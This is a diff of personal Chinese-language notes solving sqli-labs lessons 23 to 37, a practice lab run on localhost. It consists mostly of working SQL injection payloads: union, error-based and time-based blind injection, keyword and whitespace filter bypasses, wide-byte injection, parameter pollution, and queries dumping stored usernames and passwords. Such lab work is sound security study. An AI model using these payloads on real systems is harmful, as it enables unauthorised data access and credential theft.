@@ -1,6 +1,4 @@
 
-## Page 1
-
 ### Lesson 1
 
 随手加个单引号试试：
@@ -277,4 +275,189 @@ uname=dW5rbm93bicpIHVuaW9uIHNlbGVjdCBkYXRhYmFzZSgpLCAyLCAoJzMK
 
 ```
 uname=dW5rbm93biIgdW5pb24gc2VsZWN0IGRhdGFiYXNlKCksIDIsICIzCg==
+```
+
+### Lesson 23
+
+```
+http://localhost:81/Less-23/?id=-1' union select 1, database(), '3
+```
+
+```
+http://localhost:81/Less-23/?id=-1' union select 1, updatexml(1, concat(0x7e, (select database()), 0x7e), 1), '3
+```
+
+```
+http://localhost:81/Less-23/?id=1' and substr((select database()), 1, 1) = 's' and sleep(3) and '1
+```
+
+### Lesson 24
+
+1. 注册用户：username = `admin' or 1='1`，密码随意。
+2. 登陆用户
+3. 修改密码，`admin` 用户的密码会被修改。
+
+- ~~注册用户：username = `password=123&re_password=123&submit=Register&username=admin' and substr((select database()), 1, 1) = 's' and sleep(3) and '1`~~
+	- 行不通，因为 `users` 表中username 字段类型为 `varchar(20)`，太小了
+
+### Lesson 25
+
+```
+http://localhost:81/Less-25/?id=-1' union select 1, database(), '3
+```
+
+双写绕过
+
+```
+http://localhost:81/Less-25/?id=1' anandd if(substr((select database()), 1, 1) = 's', sleep(3), 0) aandnd '1
+```
+
+使用 `&&` 和 `||`
+
+```
+http://localhost:81/Less-25/?id=1' %26%26 if(substr((select database()), 1, 1) = 's', sleep(3), 0) %26%26 '1
+```
+
+### Lesson 25a
+
+```
+http://localhost:81/Less-25a/?id=-1%20union%20select%201,%20database(),%203
+```
+
+过滤了 AND 和 OR，使用符号绕过
+
+### Lesson 26
+
+```
+http://localhost:81/Less-26/?id=1'%26%26if(substr((database()),1,1)='s',sleep(3),1)%26%26'1
+```
+
+过滤了空格，可以采用其他空白字符替换：
+
+`%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%a0`
+
+测试 `%0b` 和 `%a0` 可以
+
+```
+http://localhost:81/Less-26/?id=100%27%0bunion%0bselect%0b1,%0bdatabase(),%0b%273
+```
+
+过滤了 AND 和 OR，可以用 `&&` 和 `||` 代替
+
+过滤注释符好像绕不过去，傻逼 sqlmap 构造的 payload 总想最后加个注释符，所以没法用
+
+### Lesson 26a
+
+```
+http://localhost:81/Less-26a/?id=100%27)%0bunion%0bselect%0b1,database(),(%273
+```
+
+### Lesson 27
+
+双写，大小写应该都能绕过
+
+```
+http://localhost:81/Less-27/?id=100'%0bunIon%0bseLect%0b1,database(),'3
+```
+
+```
+http://localhost:81/Less-27/?id=100'%0buniunionon%0bseleseselectlectct%0b1,database(),'3
+```
+
+### Lesson 27a
+
+双写，大小写绕过
+
+```
+http://localhost:81/Less-27a/?id=100"%0bunIon%0bselEct%0b1,database(),"3
+```
+
+```
+http://localhost:81/Less-27a/?id=100"%0buniunionon%0bseleseleselectctct%0b1,database(),"3
+```
+
+### Lesson 28
+
+```
+http://localhost:81/Less-28/?id=100')%0bunion%0bselect%0b1,database(),('3
+```
+
+### Lesson 28a
+
+```
+http://localhost:81/Less-28a/?id=100')%0bunion%0bselect%0b1,database(),('3
+```
+
+### Lesson 29
+
+?
+
+```
+http://localhost:81/Less-29/?id=100' union select 1, database(), '3
+```
+
+HTTP Parameter Pollution
+
+```
+http://localhost:81/Less-29/login.php?id=1&id=100' union select 1, database(), '3
+```
+
+### Lesson 30
+
+```
+http://localhost:81/Less-30/?id=100" union select 1, database(), "3
+```
+
+```
+http://localhost:81/Less-30/login.php?id=1&id=100" union select 1, database(), "3
+```
+
+### Lesson 31
+
+```
+http://localhost:81/Less-31/?id=100") union select 1, database(), ("3
+```
+
+```
+http://localhost:81/Less-31/login.php?id=1&id=100") union select 1, database(), ("3
+```
+
+### Lesson 32
+
+宽字节注入
+
+```
+http://localhost:81/Less-32/?id=100%df' union select 1, database(), 3 --+
+```
+
+这个好像就不好凑后面的引号了
+
+### Lesson 33
+
+```
+http://localhost:81/Less-33/?id=100%df' union select 1, database(), 3 --+
+```
+
+### Lesson 34
+
+```
+uname=admin%df' union select 1, group_concat(username, password) from users -- &passwd=unknown&submit=Submit
+```
+
+### Lesson 35
+
+```
+http://localhost:81/Less-35/?id=100 union select 1, database(), 3
+```
+
+### Lesson 36
+
+```
+http://localhost:81/Less-36/?id=100%df' union select 1, database(), 3 --+
+```
+
+### Lesson 37
+
+```
+uname=admin%df' union select 1, group_concat(username, password) from users -- &passwd=unknown&submit=Submit
 ```
